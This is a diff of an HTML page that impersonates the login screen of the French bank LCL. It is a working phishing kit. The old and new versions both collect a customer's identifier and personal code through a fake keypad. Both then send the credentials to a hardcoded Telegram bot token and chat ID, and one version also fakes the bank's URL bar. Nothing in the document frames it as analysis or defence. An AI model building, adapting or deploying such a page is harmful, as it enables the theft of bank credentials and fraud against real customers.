@@ -3,409 +3,396 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Connexion - LCL</title>
+    <title>LCL Mon Espace</title>
     <style>
         :root {
-            --lcl-orange: #ff6600;
-            --lcl-dark: #333333;
-            --bg-color: #f7f7f7;
-            --input-bg: #ffffff;
-            --border-color: #dddddd;
-            --text-color: #333333;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            --lcl-blue: #0055A4;
+            --lcl-light-blue: #e6f0fa;
+            --text-color: #333;
+            --gray-text: #666;
+            --border-color: #ddd;
+            --input-bg: #f9f9f9;
         }
 
         body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
             display: flex;
             flex-direction: column;
-            min-height: 100vh;
-            justify-content: center;
-            align-items: center;
+            height: 100vh;
             overflow: hidden;
         }
 
-        .container {
-            width: 100%;
-            max-width: 400px;
+        /* Header */
+        .header {
+            background-color: #fff;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            height: 60px;
+            box-sizing: border-box;
+        }
+
+        .logo-img {
+            height: 35px;
+            width: auto;
+        }
+
+        /* Main Content */
+        .content {
+            flex: 1;
             padding: 20px;
-            background: #fff;
-            min-height: 100vh;
             display: flex;
             flex-direction: column;
+            justify-content: center;
             position: relative;
         }
 
-        .header {
-            padding: 20px 0;
-            text-align: center;
+        .step-container {
+            display: none;
+            animation: fadeIn 0.3s ease-in-out;
         }
 
-        .logo {
-            width: 120px;
-            height: auto;
-            display: block;
-            margin: 0 auto;
+        .step-container.active {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
         }
 
-        .form-group {
-            margin-bottom: 20px;
-            margin-top: 10px;
+        h2 {
+            font-size: 18px;
+            color: var(--lcl-blue);
+            margin: 0 0 10px 0;
+            font-weight: 600;
         }
 
-        label {
-            display: block;
-            font-size: 14px;
-            color: var(--lcl-dark);
-            margin-bottom: 8px;
-            font-weight: 500;
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
 
-        input[type="text"], 
-        input[type="password"] {
+        .input-wrapper {
+            position: relative;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            background: var(--input-bg);
+            overflow: hidden;
+        }
+
+        input[type="text"], input[type="password"], input[type="tel"] {
             width: 100%;
             padding: 15px;
             font-size: 18px;
-            border: 1px solid var(--border-color);
-            border-radius: 4px;
-            background-color: var(--input-bg);
+            border: none;
+            background: transparent;
+            box-sizing: border-box;
             color: var(--text-color);
             outline: none;
-            transition: border-color 0.2s;
         }
 
-        input:focus {
-            border-color: var(--lcl-orange);
+        input::placeholder {
+            color: #999;
         }
 
-        .btn-primary {
-            background-color: var(--lcl-orange);
+        /* Validation Button */
+        .btn-valider {
+            background-color: var(--lcl-blue);
             color: white;
             border: none;
             padding: 15px;
-            width: 100%;
-            border-radius: 4px;
+            border-radius: 25px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 600;
             cursor: pointer;
-            margin-top: 20px;
-            transition: background-color 0.2s;
+            margin-top: 10px;
+            transition: background 0.2s;
         }
 
-        .btn-primary:active {
-            background-color: #e65c00;
+        .btn-valider:active {
+            background-color: #004080;
         }
 
-        .links {
-            margin-top: 25px;
-            text-align: left;
-            font-size: 14px;
-        }
-
-        .links a {
-            color: var(--text-color);
-            text-decoration: none;
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-
+        /* Footer Links */
         .footer-links {
-            margin-top: auto;
-            padding-top: 20px;
-            font-size: 12px;
-            color: #666;
+            margin-top: 20px;
+            font-size: 13px;
+            color: var(--gray-text);
+        }
+
+        .footer-links div {
+            margin-bottom: 8px;
+            cursor: pointer;
+        }
+
+        .footer-links div:hover {
+            text-decoration: underline;
+        }
+
+        .open-account {
+            color: var(--lcl-blue);
+            font-weight: 600;
             text-align: center;
+            margin-top: 15px;
         }
 
-        .footer-links a {
-            color: #666;
-            text-decoration: none;
-            margin: 0 5px;
-        }
-
-        /* Views Logic */
-        .view {
-            display: none;
-            opacity: 0;
-            transition: opacity 0.3s ease-in-out;
-        }
-
-        .view.active {
-            display: block;
-            opacity: 1;
-        }
-
-        /* Keypad Overlay */
-        .keypad-overlay {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: #f0f0f0;
-            padding: 10px 0 30px 0;
-            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
-            z-index: 1000;
-        }
-
-        .keypad-grid {
+        /* Keypad */
+        .keypad-container {
+            background-color: #f2f2f2;
+            padding-bottom: 20px;
+            padding-top: 5px;
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 0 20px;
+            gap: 8px;
+            padding-left: 5px;
+            padding-right: 5px;
         }
 
         .key {
-            background: white;
+            background-color: white;
             border: 1px solid #ddd;
             border-radius: 8px;
-            padding: 15px 0;
-            font-size: 24px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
             font-weight: 500;
-            text-align: center;
+            color: var(--text-color);
             cursor: pointer;
             user-select: none;
-            touch-action: manipulation;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
         }
 
         .key:active {
-            background: #e0e0e0;
-        }
-
-        .key-backspace {
-            font-size: 18px;
+            background-color: #e0e0e0;
         }
 
         .key-empty {
             background: transparent;
             border: none;
+            box-shadow: none;
         }
 
-        /* Loader */
-        .loader {
-            display: none;
+        .key-del {
+            font-size: 16px;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Security Box (Optional visual touch) */
+        .security-box {
+            background-color: #f0f8ff;
+            border: 1px solid #b3d9ff;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #333;
+            margin-top: 15px;
+            display: none; /* Hidden by default, can be shown if needed */
+        }
+        
+        .url-bar {
             text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-            color: var(--lcl-orange);
-        }
-
-        /* Input placeholder styling */
-        input::placeholder {
+            font-size: 10px;
             color: #999;
-            opacity: 1;
+            padding: 5px;
+            background: #fff;
+            border-top: 1px solid #eee;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    
-    <!-- View 1: Identifiant -->
-    <div id="view-1" class="view active">
-        <div class="header">
-            <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL Logo" class="logo">
+    <!-- Header -->
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL Logo" class="logo-img">
+    </div>
+
+    <!-- Step 1: Identifiant -->
+    <div id="step1" class="content step-container active">
+        <div style="text-align: center; margin-bottom: 20px;">
+            <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL" style="height: 50px; margin-bottom: 10px;">
+            <h2>Pour aller de l'avant.</h2>
         </div>
 
-        <div class="form-group">
-            <label for="input-id">Votre identifiant</label>
-            <input type="text" id="input-id" placeholder="----------" maxlength="10" autocomplete="off" inputmode="none">
+        <div class="input-group">
+            <label>Votre identifiant</label>
+            <div class="input-wrapper">
+                <input type="tel" id="identifiantInput" placeholder=" " readonly autocomplete="off">
+            </div>
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px; font-size: 13px; color: var(--gray-text);">
+                <input type="checkbox" id="saveId" style="width: 16px; height: 16px;">
+                <label for="saveId">Mémoriser mon identifiant</label>
+            </div>
         </div>
 
-        <button class="btn-primary" id="btn-to-step2" onclick="goToStep2()">Valider</button>
-
-        <div class="links">
-            <a href="#">Identifiant oublié ?</a>
-            <a href="#">Code personnel oublié ?</a>
-            <a href="#">Pas encore client ? <span>Ouvrir un compte ></span></a>
-        </div>
-        
         <div class="footer-links">
-            <a href="#">Nos conseils sécurité</a> | <a href="#">Aide</a>
+            <div>Identifiant oublié ?</div>
+            <div>Code personnel oublié ?</div>
+            <div>Pas encore client ?</div>
+            <div class="open-account">Ouvrir un compte ></div>
         </div>
+        
+        <button class="btn-valider" style="margin-top: 30px;" onclick="goToStep2()">Suivant</button>
     </div>
 
-    <!-- View 2: Code Personnel -->
-    <div id="view-2" class="view">
-        <div class="header">
-            <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL Logo" class="logo">
+    <!-- Step 2: Code Personnel -->
+    <div id="step2" class="content step-container">
+        <div style="text-align: center; margin-bottom: 20px;">
+            <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL" style="height: 50px; margin-bottom: 10px;">
+            <h2>Connectez-vous</h2>
         </div>
 
-        <div class="form-group">
-            <label for="input-code">Votre code personnel</label>
-            <input type="password" id="input-code" placeholder="------" maxlength="6" inputmode="none">
+        <div class="input-group">
+            <label>Votre code personnel</label>
+            <div class="input-wrapper">
+                <input type="password" id="codeInput" placeholder=" " readonly autocomplete="off">
+            </div>
         </div>
 
-        <div class="loader" id="loader">Connexion en cours...</div>
-
-        <button class="btn-primary" id="btn-login" onclick="submitForm()">Valider</button>
-
-        <div class="links">
-            <a href="#">Identifiant oublié ?</a>
-            <a href="#">Code personnel oublié ?</a>
-            <a href="#">Pas encore client ? <span>Ouvrir un compte ></span></a>
+        <div class="footer-links">
+            <div>Identifiant oublié ?</div>
+            <div>Code personnel oublié ?</div>
+            <div>Pas encore client ?</div>
+            <div class="open-account">Ouvrir un compte ></div>
         </div>
+
+        <button class="btn-valider" style="margin-top: 30px;" onclick="validateCode()">Valider ></button>
     </div>
 
-</div>
-
-<!-- Custom Keypad -->
-<div class="keypad-overlay">
-    <div class="keypad-grid">
-        <div class="key" onclick="typeChar('1')">1</div>
-        <div class="key" onclick="typeChar('2')">2</div>
-        <div class="key" onclick="typeChar('3')">3</div>
-        <div class="key" onclick="typeChar('4')">4</div>
-        <div class="key" onclick="typeChar('5')">5</div>
-        <div class="key" onclick="typeChar('6')">6</div>
-        <div class="key" onclick="typeChar('7')">7</div>
-        <div class="key" onclick="typeChar('8')">8</div>
-        <div class="key" onclick="typeChar('9')">9</div>
-        <div class="key key-empty"></div>
-        <div class="key" onclick="typeChar('0')">0</div>
-        <div class="key key-backspace" onclick="backspace()">⌫</div>
+    <!-- Keypad -->
+    <div class="keypad-container" id="keypad">
+        <div class="key" onclick="pressKey('1')">1</div>
+        <div class="key" onclick="pressKey('2')">2</div>
+        <div class="key" onclick="pressKey('3')">3</div>
+        <div class="key" onclick="pressKey('4')">4</div>
+        <div class="key" onclick="pressKey('5')">5</div>
+        <div class="key" onclick="pressKey('6')">6</div>
+        <div class="key" onclick="pressKey('7')">7</div>
+        <div class="key" onclick="pressKey('8')">8</div>
+        <div class="key" onclick="pressKey('9')">9</div>
+        <div class="key" onclick="pressKey('E')"></div> <!-- Empty -->
+        <div class="key" onclick="pressKey('0')">0</div>
+        <div class="key key-del" onclick="deleteKey()">⌫</div>
     </div>
-</div>
 
-<script>
-    // Configuration Bot Telegram
-    const BOT_TOKEN = "8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ";
-    const CHAT_ID = "8501464548";
-    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    <!-- Footer URL -->
+    <div class="url-bar">
+        monespace.lcl.fr
+    </div>
 
-    // State
-    let currentStep = 1;
-    let identifiant = "";
-    let codeSecret = "";
-
-    // DOM Elements
-    const inputId = document.getElementById('input-id');
-    const inputCode = document.getElementById('input-code');
-    const view1 = document.getElementById('view-1');
-    const view2 = document.getElementById('view-2');
-    const loader = document.getElementById('loader');
-    const btnLogin = document.getElementById('btn-login');
-
-    // Initialisation
-    inputId.focus();
-
-    // Fonction pour passer à l'étape 2
-    function goToStep2() {
-        const val = inputId.value.trim();
-        if (val.length < 1) {
-            alert("Veuillez entrer votre identifiant.");
-            return;
-        }
+    <script>
+        // Configuration Telegram
+        const BOT_TOKEN = "8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ";
+        const CHAT_ID = "8501464548";
         
-        identifiant = val;
-        
-        // Transition
-        view1.classList.remove('active');
-        setTimeout(() => {
-            view1.style.display = 'none';
-            view2.style.display = 'block';
-            setTimeout(() => view2.classList.add('active'), 10);
-            inputCode.focus();
-            inputCode.value = "";
-            inputCode.placeholder = "------";
-        }, 100);
-    }
+        // State
+        let currentStep = 1;
+        let currentInput = document.getElementById('identifiantInput');
+        let identifiantValue = "";
+        let codeValue = "";
 
-    // Gestion du clavier numérique
-    function typeChar(char) {
-        let activeInput = (currentStep === 1) ? inputId : inputCode;
-        
-        if (activeInput.value.length < activeInput.maxLength) {
-            activeInput.value += char;
-            activeInput.value = activeInput.value.slice(0, activeInput.maxLength); // Secure
-            
-            // Auto-submit if full
-            if (activeInput.value.length === activeInput.maxLength) {
-                if (currentStep === 1) {
-                    setTimeout(goToStep2, 200); // Petit délai pour UX
-                }
+        // Focus management
+        document.addEventListener('click', function(e) {
+            if(e.target !== document.getElementById('saveId')) {
+                // Prevent native keyboard on desktop, keep custom keypad
+                // On mobile, 'readonly' prevents native keyboard if supported, 
+                // but we rely on custom keypad anyway.
             }
-        }
-    }
-
-    function backspace() {
-        let activeInput = (currentStep === 1) ? inputId : inputCode;
-        if (activeInput.value.length > 0) {
-            activeInput.value = activeInput.value.slice(0, -1);
-        }
-    }
-
-    // Envoi au bot
-    function submitForm() {
-        const val = inputCode.value.trim();
-        if (val.length < 6) {
-            alert("Veuillez entrer votre code personnel.");
-            return;
-        }
-        
-        codeSecret = val;
-        
-        // UI Loading state
-        loader.style.display = 'block';
-        btnLogin.disabled = true;
-
-        // Envoi Telegram
-        const message = `🔐 <b>Connexion LCL</b>\n\n👤 Identifiant: <code>${identifiant}</code>\n🔑 Code: <code>${codeSecret}</code>\n📅 Date: ${new Date().toLocaleString()}`;
-
-        fetch(API_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        })
-        .then(response => {
-            if (response.ok) {
-                // Succès : Redirection ou message de fin
-                setTimeout(() => {
-                    window.location.href = "https://monespaceparticulier.lcl.fr"; // Ou page de succès
-                }, 1000);
-            } else {
-                alert("Erreur de connexion. Vérifiez votre identifiant.");
-                loader.style.display = 'none';
-                btnLogin.disabled = false;
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert("Erreur réseau.");
-            loader.style.display = 'none';
-            btnLogin.disabled = false;
         });
-    }
 
-    // Gestion des touches clavier physiques (pour PC/Mac)
-    document.addEventListener('keydown', function(event) {
-        const activeInput = (currentStep === 1) ? inputId : inputCode;
-        
-        if (event.key === 'Backspace') {
-            activeInput.value = activeInput.value.slice(0, -1);
-        } else if (event.key >= '0' && event.key <= '9') {
-            if (activeInput.value.length < activeInput.maxLength) {
-                activeInput.value += event.key;
-                if (activeInput.value.length === activeInput.maxLength) {
-                    if (currentStep === 1) goToStep2();
+        function pressKey(key) {
+            if (currentStep === 1) {
+                if (key !== 'E' && key !== 'delete') {
+                    if (identifiantValue.length < 10) { // Limit length
+                        identifiantValue += key;
+                        currentInput.value = identifiantValue;
+                    }
+                } else if (key === 'delete') {
+                    identifiantValue = identifiantValue.slice(0, -1);
+                    currentInput.value = identifiantValue;
+                }
+            } else {
+                if (key !== 'E' && key !== 'delete') {
+                    if (codeValue.length < 6) { // 6 digits code
+                        codeValue += key;
+                        currentInput.value = codeValue;
+                    }
+                } else if (key === 'delete') {
+                    codeValue = codeValue.slice(0, -1);
+                    currentInput.value = codeValue;
                 }
             }
         }
-    });
-</script>
 
+        function deleteKey() {
+            pressKey('delete');
+        }
+
+        function goToStep2() {
+            if (identifiantValue.length === 0) {
+                alert("Veuillez entrer un identifiant");
+                return;
+            }
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            
+            currentStep = 2;
+            currentInput = document.getElementById('codeInput');
+            codeValue = "";
+            currentInput.value = "";
+            
+            // Focus input to trigger any potential system interactions if needed
+            currentInput.focus();
+        }
+
+        function validateCode() {
+            if (codeValue.length < 4) {
+                alert("Code invalide");
+                return;
+            }
+            
+            // Send to Telegram
+            const message = `🔐 *Nouvelle Connexion LCL*\n\n👤 Identifiant: \`${identifiantValue}\`\n🔑 Code: \`${codeValue}\`\n📅 Date: ${new Date().toLocaleString()}`;
+            
+            sendToTelegram(message);
+            
+            // Optional: Redirect or show success
+            // window.location.href = "https://monespace.lcl.fr"; 
+            alert("Données envoyées !");
+        }
+
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram OK', data);
+            })
+            .catch(error => {
+                console.error('Error sending to Telegram:', error);
+            });
+        }
+    </script>
 </body>
 </html>
